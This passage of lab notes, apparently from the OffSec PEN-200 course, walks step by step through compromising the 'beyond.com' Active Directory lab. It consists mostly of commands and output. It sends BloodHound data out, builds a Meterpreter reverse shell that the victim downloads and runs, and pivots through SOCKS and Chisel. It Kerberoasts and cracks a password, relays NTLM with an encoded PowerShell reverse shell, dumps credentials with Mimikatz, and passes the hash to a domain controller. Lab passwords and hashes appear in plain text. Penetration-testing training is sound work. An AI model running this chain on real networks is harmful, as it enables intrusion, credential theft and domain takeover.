PS C:\Users\marcus> iwr -uri http://192.168.45.214:8000/SharpHound.ps1 -Outfile SharpHound.ps1
iwr -uri http://192.168.45.214:8000/SharpHound.ps1 -Outfile SharpHound.ps1
PS C:\Users\marcus> powershell -ep bypass
powershell -ep bypass
PS C:\Users\marcus> . .\SharpHound.ps1
. .\SharpHound.ps1
PS C:\Users\marcus> . .\SharpHound.ps1
. .\SharpHound.ps1
PS C:\Users\marcus> Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound -CollectionMethod All
2025-03-18T08:57:54.4374618-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2025-03-18T08:57:54.5468360-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-03-18T08:57:54.5468360-07:00|INFORMATION|Initializing SharpHound at 8:57 AM on 3/18/2025
2025-03-18T08:57:54.6093337-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for beyond.com : DCSRV1.beyond.com
2025-03-18T08:57:54.7812108-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-03-18T08:57:54.8749602-07:00|INFORMATION|Beginning LDAP search for beyond.com
2025-03-18T08:57:54.8905900-07:00|INFORMATION|Producer has finished, closing LDAP channel
2025-03-18T08:57:54.8905900-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-03-18T08:58:25.8281459-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 99 MB RAM
2025-03-18T08:58:37.5781689-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2025-03-18T08:58:37.5937523-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2025-03-18T08:58:37.6718771-07:00|INFORMATION|Status: 97 objects finished (+97 2.309524)/s -- Using 105 MB RAM
2025-03-18T08:58:37.6718771-07:00|INFORMATION|Enumeration finished in 00:00:42.8001829
2025-03-18T08:58:37.7187518-07:00|INFORMATION|Saving cache with stats: 56 ID to type mappings.
 57 name to SID mappings.
 1 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2025-03-18T08:58:37.7187518-07:00|INFORMATION|SharpHound Enumeration Completed at 8:58 AM on 3/18/2025! Happy Graphing!
```
> 成功執行後，會生成 BloodHound.zip，再將其傳送回 Kali 分析

#### 3. 使用 BloodHound 分析 AD 結構
>[!Caution]
>直接使用 `scp -v 20250318085837_BloodHound.zip chw@192.168.45.214:/home/chw/beyond/`\
>會倒置 Error: `debug1: read_passphrase: can't open /dev/tty: No such file or directory`:\
> SCP 無法在 Windows PowerShell 中提示輸入密碼，因為 OpenSSH for Windows 預設會嘗試從 /dev/tty 讀取密碼，而 Windows 沒有 /dev/tty 這個裝置

Kali 寫一個 upload.py，接收檔案 (python http.server 不接收 `PUT`)
```
┌──(chw㉿CHW)-[~/beyond]
└─$ cat upload.py                   
#!/usr/bin/env python3
from http.server import SimpleHTTPRequestHandler, HTTPServer

class HTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_PUT(self):
        file_path = self.translate_path(self.path)
        length = int(self.headers['Content-Length'])
        with open(file_path, 'wb') as f:
            f.write(self.rfile.read(length))
        self.send_response(201, "Created")
        self.end_headers()

server_address = ('0.0.0.0', 8000)  # 監聽所有 IP，使用 8000 端口
httpd = HTTPServer(server_address, HTTPRequestHandler)
print("Serving HTTP on port 8000 (Upload Enabled)...")
httpd.serve_forever()

┌──(chw㉿CHW)-[~/beyond]
└─$ python3 upload.py     

Serving HTTP on port 8000 (Upload Enabled)...
192.168.117.242 - - [18/Mar/2025 13:12:47] "PUT /20250318085837_BloodHound.zip HTTP/1.1" 201 -

```
Window: marcus 上傳
```
PS C:\Users\marcus> Invoke-WebRequest -Uri "http://192.168.45.214:8000/20250318085837_BloodHound.zip" -Method Put -InFile "20250318085837_BloodHound.zip"
Invoke-WebRequest -Uri "http://192.168.45.214:8000/20250318085837_BloodHound.zip" -Method Put -InFile "20250318085837_BloodHound.zip"


StatusCode        : 201
StatusDescription : Created
Content           : {}
RawContent        : HTTP/1.0 201 Created
                    Date: Tue, 18 Mar 2025 17:12:47 GMT
                    Server: SimpleHTTP/0.6 Python/3.11.9
                    
                    
Headers           : {[Date, Tue, 18 Mar 2025 17:12:47 GMT], [Server, SimpleHTTP/0.6 Python/3.11.9]}
RawContentLength  : 0

```
Kali 啟動 neo4j 和 BloodHound:
使用 Cypher Query Language 搜尋
#### 3.1 搜尋所有電腦
```
MATCH (m:Computer) RETURN m
```
![image](https://hackmd.io/_uploads/BySlhQwnkl.png)
> 我們擁有 interactive shell 的 `CLIENTWK1` 之外，BloodHound 還識別了已知的DC `DCSRV1` 和主郵件伺服器 MAILSRV1。此外，它還發現了另一台名為 `INTERNALSRV1` 的機器。
> >`DCSRV1.BEYOND.COM` - Windows Server 2022 Standard\
`INTERNALSRV1.BEYOND.COM` - Windows Server 2022 Standard\
`MAILSRV1.BEYOND.COM` - Windows Server 2022 Standard\
`CLIENTWK1.BEYOND.COM` - Windows 11 Pro


nslookup 查詢 `INTERNALSRV1`
```
PS C:\Users\marcus> nslookup INTERNALSRV1.BEYOND.COM
nslookup INTERNALSRV1.BEYOND.COM
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  172.16.73.240

Name:    INTERNALSRV1.BEYOND.COM
Address:  172.16.73.241

```

更新 Kali 的 computer.txt:
```
┌──(chw㉿CHW)-[~/beyond]
└─$ cat computer.txt
172.16.73.240 - DCSRV1.BEYOND.COM  # 可能是網域控制器
172.16.73.241 - INTERNALSRV1.BEYOND.COM  # 內部伺服器
172.16.73.254 - MAILSRV1.BEYOND.COM  # 內部郵件伺服器，雙網卡設備
172.16.73.244 - CLIENTWK1.BEYOND.COM  # 目前我們入侵的電腦

```
#### 3.1 搜尋所有使用者
```
MATCH (u:User) RETURN u
```
![image](https://hackmd.io/_uploads/BJ3Xpmwh1g.png)
> 除了 AD 預設 user:
> BECCY\
JOHN\
DANIELA\
MARCUS
>> 發現新的 domain account `BECCY`，並確認 `DANIELA` 也是 domain user

將 marcus（CLIENTWK1 上的互動式 shell）和 john（有效憑證）標記為 `Owned`\
並更新 Kali 的 usernames.txt:
```
┌──(chw㉿CHW)-[~/beyond]
└─$ cat usernames.txt 
marcus
john
daniela
beccy
```
#### 3.3 查詢網域管理員
選擇 Find All Domain Admins\
![image](https://hackmd.io/_uploads/ryZcC7v3kg.png)
> Domain Admins:\
> - BECCY
> - Administrator
> > 目標：拿下 `BECCY`

- Find Workstations where Domain Users can RDP
- Find Servers where Domain Users can RDP
- Find Computers where Domain Users are Local Admin
- Shortest Path to Domain Admins from Owned Principals

Analysis 的以上條件都不符合\
另外，也沒有 Domain User 是任何本機的 Local Admin。因此，我們沒有以 john 或 marcus 身分存取任何網域電腦的特權

### Services and Sessions

>[!Note]
>進一步分析內網環境，找出更多潛在的攻擊向量。
> - 查詢目前活躍的使用者登入會話 (Sessions)
> - 尋找可以進行 Kerberoasting 攻擊的帳號
> - 透過 SOCKS5 Proxy 進行內部網路掃描
> - 存取 INTERNALSRV1 上的 WordPress 站點

#### 1. 確認目前登入的使用者 (Active Sessions)
Cypher 查詢列出所有登入的使用者
```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```
![image](https://hackmd.io/_uploads/By_jgNPnkx.png)
> 1. CLIENTWK1 → marcus (已知)
>2. MAILSRV1 → beccy (域管理員):若拿到機器的特權訪問，就可以提取該用戶的 NTLM hash
>3. INTERNALSRV1 → Administrator (本機管理員): RID 500

#### 2. 確認可以進行 Kerberoasting 的帳號
識別網域中所有 kerberoastable 使用者\
Analysis 選擇 List All Kerberoastable Accounts\
![image](https://hackmd.io/_uploads/Bk7eMEDhJx.png)
> daniela 也是可攻擊目標

daniela > Node Info > Service Principal Names\
SPN: `http/internalsrv1.beyond.com`

>[!Note]
>假設 `INTERNALSRV1` 上執行一個 Web 伺服器。一旦我們執行了 Kerberoasting 可能獲得 daniela 的明文密碼，就可以使用它來存取 `INTERNALSRV1`。\
>使用 Kerberoasting 攻擊來取得 Hash

#### 3. 透過 SOCKS5 Proxy 進行內網掃描
需要對內網進行 `Nmap` 和 `CrackMapExec` 掃描
#### 3.1 使用 msfvenom 產生 Meterpreter Reverse Shell
```
┌──(chw㉿CHW)-[~/beyond]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.214 LPORT=443 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: met.exe

┌──(chw㉿CHW)-[~/beyond]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
啟用 msfconsole  監聽
```
┌──(chw㉿CHW)-[~/beyond]
└─$ sudo msfconsole -q
[sudo] password for chw: 
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.45.214
LHOST => 192.168.45.214
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > 
[*] Started reverse TCP handler on 192.168.45.214:443 

```
> `set ExitOnSession false`: 設定為 false，multi/handler 會一直保持運行，即使已有 session 連線，也會繼續等待新的連線\
> `run -j`: background job 讓 handler 在背景執行，不會影響 Metasploit console
#### 3.2 在 CLIENTWK1 下載並執行
```
PS C:\Users\marcus> iwr -uri http://192.168.45.214:8000/met.exe -Outfile met.exe
iwr -uri http://192.168.45.214:8000/met.exe -Outfile met.exe
PS C:\Users\marcus> .\met.exe
.\met.exe
```
msfconsole 收到 reverse shell
```
msf6 exploit(multi/handler) > 
[*] Started reverse TCP handler on 192.168.45.214:443 
[*] Sending stage (201798 bytes) to 192.168.117.242
[*] Meterpreter session 1 opened (192.168.45.214:443 -> 192.168.117.242:62790) at 2025-03-18 14:02:09 -0400
```
#### 3.3  在 Metasploit 建立 SOCKS5 Proxy
1. 自動設定內部路由 (autoroute)
```
msf6 exploit(multi/handler) > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set session 1
session => 1
msf6 post(multi/manage/autoroute) > run

[*] Running module against CLIENTWK1
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.16.73.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
```
> autoroute modulw 會自動分析 `CLIENTWK1` 連接的內部網段\
發現 CLIENTWK1 連接到 172.16.73.0/24，並自動建立路由\
現在 Kali 可以透過 CLIENTWK1 存取 172.16.73.0/24 內網

2. 建立 SOCKS5 Proxy
```
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
VERSION => 5
msf6 auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 1.
msf6 auxiliary(server/socks_proxy) > 
[*] Starting the SOCKS proxy server

```
> 啟動 SOCKS5 代理伺服器，讓 Kali 透過 CLIENTWK1 來存取 172.16.73.0/24\
`SRVHOST 127.0.0.1`: 只允許本機 (Kali) 使用 proxy\
因此可以使用 proxychains 透過 CLIENTWK1 掃描和存取內部網路

檢查先前章節的設定還在
```
┌──(chw㉿CHW)-[~/beyond]
└─$ cat /etc/proxychains4.conf
...
socks5  127.0.0.1 1080
```

#### 3.4 透過 CrackMapExec 掃描 SMB share
使用 proxychains 枚舉內部 SMB
```
┌──(chw㉿CHW)-[~/beyond]
└─$ proxychains -q crackmapexec smb 172.16.73.240-241 172.16.73.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares --no-bruteforce
SMB         172.16.73.240    445    DCSRV1           [*] Windows 10.0 Build 20348 x64 (name:DCSRV1) (domain:beyond.com) (signing:True) (SMBv1:False)
SMB         172.16.73.241    445    INTERNALSRV1     [*] Windows 10.0 Build 20348 x64 (name:INTERNALSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         172.16.73.254    445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         172.16.73.240    445    DCSRV1           [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.73.241    445    INTERNALSRV1     [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.73.240    445    DCSRV1           [+] Enumerated shares
SMB         172.16.73.240    445    DCSRV1           Share           Permissions     Remark
SMB         172.16.73.240    445    DCSRV1           -----           -----------     ------
SMB         172.16.73.240    445    DCSRV1           ADMIN$                          Remote Admin
SMB         172.16.73.240    445    DCSRV1           C$                              Default share
SMB         172.16.73.240    445    DCSRV1           IPC$            READ            Remote IPC
SMB         172.16.73.240    445    DCSRV1           NETLOGON        READ            Logon server share 
SMB         172.16.73.240    445    DCSRV1           SYSVOL          READ            Logon server share 
SMB         172.16.73.241    445    INTERNALSRV1     [+] Enumerated shares
SMB         172.16.73.241    445    INTERNALSRV1     Share           Permissions     Remark
SMB         172.16.73.241    445    INTERNALSRV1     -----           -----------     ------
SMB         172.16.73.241    445    INTERNALSRV1     ADMIN$                          Remote Admin
SMB         172.16.73.241    445    INTERNALSRV1     C$                              Default share
SMB         172.16.73.241    445    INTERNALSRV1     IPC$            READ            Remote IPC
SMB         172.16.73.254    445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         172.16.73.254    445    MAILSRV1         [+] Enumerated shares
SMB         172.16.73.254    445    MAILSRV1         Share           Permissions     Remark
SMB         172.16.73.254    445    MAILSRV1         -----           -----------     ------
SMB         172.16.73.254    445    MAILSRV1         ADMIN$                          Remote Admin
SMB         172.16.73.254    445    MAILSRV1         C$                              Default share
SMB         172.16.73.254    445    MAILSRV1         IPC$            READ            Remote IPC
```
> 172.16.73.240 (DCSRV1)  - 可讀取 `NETLOGON` 和 `SYSVOL`\
172.16.73.241 (INTERNALSRV1) - 只有預設共享 (無權限)\
172.16.73.254 (MAILSRV1) - 只有預設共享 (無權限)

#### 3.5 透過 Nmap 掃描內部 Web 服務
```
──(chw㉿CHW)-[~/beyond]
└─$ sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.73.240 172.16.73.241 172.16.73.254
[sudo] password for chw: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-18 14:31 EDT
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 172.16.73.240
Host is up (2.6s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  closed http
443/tcp closed https

Nmap scan report for 172.16.73.241
Host is up (5.3s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  open   http
443/tcp open   https

Nmap scan report for 172.16.73.254
Host is up (2.6s latency).

PORT    STATE  SERVICE
21/tcp  closed ftp
80/tcp  open   http
443/tcp closed https

Nmap done: 3 IP addresses (3 hosts up) scanned in 42.35 seconds
```
> DCSRV1 (172.16.73.240): 無 Web 服務\
INTERNALSRV1 (172.16.73.241): HTTP (80) 和 HTTPS (443) 開啟\
MAILSRV1 (172.16.73.254): HTTP (80) 開啟
>> 可確認 INTERNALSRV1 與 MAILSRV1 有 Web 服務

#### 3.6 透過 Chisel 瀏覽 INTERNALSRV1 Web 服務
1. 在 Kali 啟動 Chisel Server
```
┌──(chw㉿CHW)-[~/beyond]
└─$ cp /usr/bin/chisel .                                           
┌──(chw㉿CHW)-[~/beyond]
└─$ chmod a+x chisel
    
┌──(chw㉿CHW)-[~/beyond]
└─$ ./chisel server -p 8080 --reverse
2025/03/18 14:36:09 server: Reverse tunnelling enabled
2025/03/18 14:36:09 server: Fingerprint VbGEO884eECfHw8SWkKLxuZkJEG0FURB/tJ8RauoI/o=
2025/03/18 14:36:09 server: Listening on http://0.0.0.0:8080

```
```
┌──(chw㉿CHW)-[~/beyond]
└─$ cp /home/chw/Chisel_x64/chisel ./chisel_x64

┌──(chw㉿CHW)-[~/beyond]
└─$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```
在 CLIENTWK1 執行 Chisel 並進行反向連線
```
PS C:\Users\marcus> iwr -uri http://192.168.45.214:8888/chisel_x64 -Outfile chisel.exe 
iwr -uri http://192.168.45.214:8888/chisel_x64 -Outfile chisel.exe
2025/03/11 15:01:46 client: Connecting to ws://192.168.119.5:8080
2025/03/11 15:01:46 client: Connected (Latency 11.0449ms)
```

2. 嘗試登入 WordPress
前往管理頁面 http://127.0.0.1/wordpress/wp-admin 會跳轉至 `internalsrv1.beyond.com`\
手動加入 `/etc/hosts`
```
┌──(chw㉿CHW)-[~/beyond]
└─$ vi /etc/hosts  
...
127.0.0.1    internalsrv1.beyond.com
```
打開 /wp-admin\
![image](https://hackmd.io/_uploads/BkEQ7rDn1l.png)

## Attacking an Internal Web Application
目標：
- 對 daniela 進行 Kerberoasting，取得 WordPress 登入密碼
- 濫用 WordPress Plugin，發動 NTLM Relay 攻擊，取得 MAILSRV1 的 SYSTEM 權限

### Speak Kerberoast and Enter
INTERNALSRV1 上的 Web Application 是目前最有希望的目標。因為是一個 WordPress 網站
#### Kerberoasting 取得 daniela 的密碼
- daniela 是 Kerberoastable
- SPN 是 `http/internalsrv1.beyond.com `，表示可能有 WordPress 管理權限
#### 1. 利用 impacket-GetUserSPNs 取得 TGS-REP Hash
```
┌──(chw㉿CHW)-[~/beyond]
└─$ proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.73.240 beyond.com/john

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName      Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
------------------------  -------  --------  --------------------------  --------------------------  ----------
http/internalsrv1.beyond.com  daniela            2025-03-11 16:17:20.062328  2025-03-11 16:59:48.376728             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$4c6c4600baa0ef09e40fde6130e3d770$49023c03dcf9a21ea5b943e179f843c575d8f54b1cd85ab12658364c23a46fa53b3db5f924a66b1b28143f6a357abea0cf89af42e08fc38d23b205a3e1b46aed9e181446fa7002def837df76ca5345e3277abaa86...
2e430c5a8f0235b45b66c5fe0c8b4ba16efc91586fc22c2c9c1d8d0434d4901d32665cceac1ab0cdcb89ae2c2d688307b9c5d361beba29b75827b058de5a5bba8e60af3562f935bd34feebad8e94d44c0aebc032a3661001541b4e30a20d380cac5047d2dafeb70e1ca3f9e507eb72a4c7
```
> 成功取得 daniela 的 `TGS-REP Hash`

#### 2. 使用 Hashcat 破解密碼
```
┌──(chw㉿CHW)-[~/beyond]
└─$ sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
...
$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$b0750f4754ff26fe77d2288ae3cca539$0922083b88587a2e765298cc7d499b368f7c39c7f6941a4b419d8bb1405e7097891c1af0a885ee76ccd1f32e988d6c4653e5cf4ab9602004d84a6e1702d2fbd5a3379bd376de696b0e8993aeef5b1e78fb24f5d3c
...
3d3e9d5c0770cc6754c338887f11b5a85563de36196b00d5cddecf494cfc43fcbef3b73ade4c9b09c8ef405b801d205bf0b21a3bca7ad3f59b0ac7f6184ecc1d6f066016bb37552ff6dd098f934b2405b99501f2287128bff4071409cec4e9545d9fad76e6b18900b308eaac8b575f60bb:DANIelaRO123
...
```
> `daniela`:`DANIelaRO123`

#### 3. 登入 INTERNALSRV1 的 WordPress
登入 http://127.0.0.1/wordpress/wp-admin\
![image](https://hackmd.io/_uploads/ByM26jw2ye.png)

### Abuse a WordPress Plugin for a Relay Attack

#### 1. 瀏覽 WordPress 設定
- daniela 是唯一的 WordPress 使用者
![image](https://hackmd.io/_uploads/rkqmAoD2yl.png)
- 唯一啟用的 Plugin 是 `Backup Migration`
![image](https://hackmd.io/_uploads/Bku40svnyl.png)
- 外掛允許自定義「備份目標目錄」
![image](https://hackmd.io/_uploads/rk6cRiD3kg.png)
> 可以當作目標設為攻擊機器來誘導目標伺服器進行身份驗證
#### 2. NTLM Relay 攻擊計畫
- `INTERNALSRV1` 的本機管理員 (Administrator) 可能與 `MAILSRV1` 的管理員使用相同密碼
- MAILSRV1 禁用 SMB signing，可進行 NTLM Relay 攻擊
- 利用 WordPress  Plugin 設定備份目標為我們的 Kali 機器 (//192.168.45.214/test)
    - 這將導致 `INTERNALSRV1` 嘗試對 Kali 進行身份驗證
    - 可以攔截 NTLM 驗證，並將其轉發到 `MAILSRV1` 以獲得 SYSTEM 權限

#### 3. 設置 NTLM Relay 攻擊
##### 3.1 啟動 impacket-ntlmrelayx
啟動 impacket-ntlmrelayx
```
┌──(chw㉿CHW)-[~/beyond]
└─$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.45.214 -c "powershell -enc JABjAGwAaQ..."
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```
> `impacket-ntlmrelayx`：使用 Impacket 工具套件來執行 NTLM Relay 攻擊\
> `--no-http-server`: 關閉 HTTP 伺服器\
> `-smb2support`: 啟用對 SMBv2 的支援\
> `-t 192.168.45.214`: 指定攻擊目標（將 NTLM 驗證請求轉發到的機器）\
> Revers shell : [powershell_reverse_shell.ps1](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)

kali 開啟 nc 監聽：
```
┌──(chw㉿CHW)-[~/beyond]
└─$ nc -nvlp 9999
listening on [any] 9999 ...
```
##### 3.2 設置 WordPress Backup Migration Plugin
將備份目錄設定為 Kali SMB 伺服器 (192.168.45.214)
```
//192.168.45.214/test
```
> 強制 INTERNALSRV1 向 Kali 伺服器進行 NTLM 身份驗證\
> "SAVE"

(impacket-ntlmrelayx)
```
└─$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.45.214 -c "powershell -enc JABjAGwAaQ..."
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
...
[*] Servers started, waiting for connections
...
[*] Authenticating against smb://192.168.117.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
...
[*] Service RemoteRegistry is in stopped state
...
[*] Starting service RemoteRegistry
...
[*] Executed specified command on host: 192.168.117.242
...
[*] Stopping service RemoteRegistry
```
(Kali listenning Port)
```
┌──(chw㉿CHW)-[~/beyond]
└─$ nc -nvlp 9999
listening on [any] 9999 ...
connect to [192.168.45.214] from (UNKNOWN) [192.168.117.242] 50063
whoami
nt authority\system

PS C:\Windows\system32> hostname
MAILSRV1

PS C:\Windows\system32> 
```

`MAILSRV1` 上的 NT AUTHORITY\SYSTEM 可以存取 MAILSRV1 上 beccy 的 NTLM hash\
🎯 進一步取得 Domain Controller (`DCSRV1`) 的控制權

## Gaining Access to the Domain Controller
### Cached Credentials
>[!Tip]
>Depending on the objective of the penetration test, we should not skip the local enumeration of the MAILSRV1 system. This could reveal additional vulnerabilities and sensitive information, which we may miss if we directly attempt to extract the NTLM hash for beccy.

#### 1. 下載並執行 Meterpreter 取得更強大的 shell
```
PS C:\Windows\system32> cd C:\Users\Administrator

PS C:\Users\Administrator> iwr -uri http://192.168.45.214:8000/met.exe -Outfile met.exe

PS C:\Users\Administrator> .\met.exe
```
( 在 Kali 上接收 `MAILSRV1` 的 Meterpreter)
```
[*] Sending stage (200774 bytes) to 192.168.117.242
[*] Meterpreter session 2 opened (192.168.45.214:443 -> 192.168.117.242:50814)

msf6 post(multi/manage/autoroute) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > shell
Process 416 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\Administrator> 
```
#### 2. 下載並執行 Mimikatz 取得 beccy 的憑證
```
PS C:\Users\Administrator> iwr -uri http://192.168.45.214:8000/mimikatz.exe -Outfile mimikatz.exe

PS C:\Users\Administrator> .\mimikatz.exe
.\mimi.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Mar 19 2025 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
  ...
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
...
Authentication Id : 0 ; 253683 (00000000:0003def3)
Session           : Interactive from 1
User Name         : beccy
Domain            : BEYOND
Logon Server      : DCSRV1
Logon Time        : 3/8/2023 4:50:32 AM
SID               : S-1-5-21-1104084343-2915547075-2081307249-1108
        msv :
         [00000003] Primary
         * Username : beccy
         * Domain   : BEYOND
         * NTLM     : f0397ec5af49971f6efbdb07877046b3
         * SHA1     : 2d878614fb421517452fd99a3e2c52dee443c8cc
         * DPAPI    : 4aea2aa4fa4955d5093d5f14aa007c56
        tspkg :
        wdigest :
         * Username : beccy
         * Domain   : BEYOND
         * Password : (null)
        kerberos :
         * Username : beccy
         * Domain   : BEYOND.COM
         * Password : NiftyTopekaDevolve6655!#!
...
```
> beccy:
> - NTLM Hash `f0397ec5af49971f6efbdb07877046b3`
> - 明文密碼 `NiftyTopekaDevolve6655!#!`

#### 3. 存儲憑證，入侵 DCSRV1
```
┌──(chw㉿CHW)-[~/beyond]
└─$ cat creds.txt
...
beccy:NiftyTopekaDevolve6655!#!
beccy NTLM Hash: f0397ec5af49971f6efbdb07877046b3
```
### Lateral Movement
使用 beccy 的 NTLM Hash 透過 `impacket-psexec` 取得 DCSRV1 的控制權
> 透過 Pass-the-Hash (PTH) 攻擊，使用 impacket-psexec 取得 DCSRV1 的 SYSTEM 權限

```
┌──(chw㉿CHW)-[~/beyond]
└─$ proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.73.240
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 172.16.73.240.....
[*] Found writable share ADMIN$
[*] Uploading file CGOrpfCz.exe
[*] Opening SVCManager on 172.16.73.240.....
[*] Creating service tahE on 172.16.73.240.....
[*] Starting service tahE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.


C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DCSRV1

C:\Windows\system32> ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.73.240
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.73.254
```
>[!Important]
>成功控制 BEYOND.COM 網域\
>💡 接下來可以執行 `DCSync` 或 `Mimikatz` 來擷取完整的網域密碼雜湊，建立 Persistence

## Report
- [Penetration_Testing_Report.pdf](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/misc/assembling_the_pieces/daeebbc40a5cfbb70d96f6b10104b453-assemble_flag.pdf)


>[!Caution]
>Offsec:\
>"**Don't give up, and remember the Try Harder -mindset!**"\
>([𝄞 BGM 🎵](https://youtu.be/t-bgRQfeW64?si=vW85In80qfVBfStn))\
>![image](https://hackmd.io/_uploads/By6nJpvhJx.png)

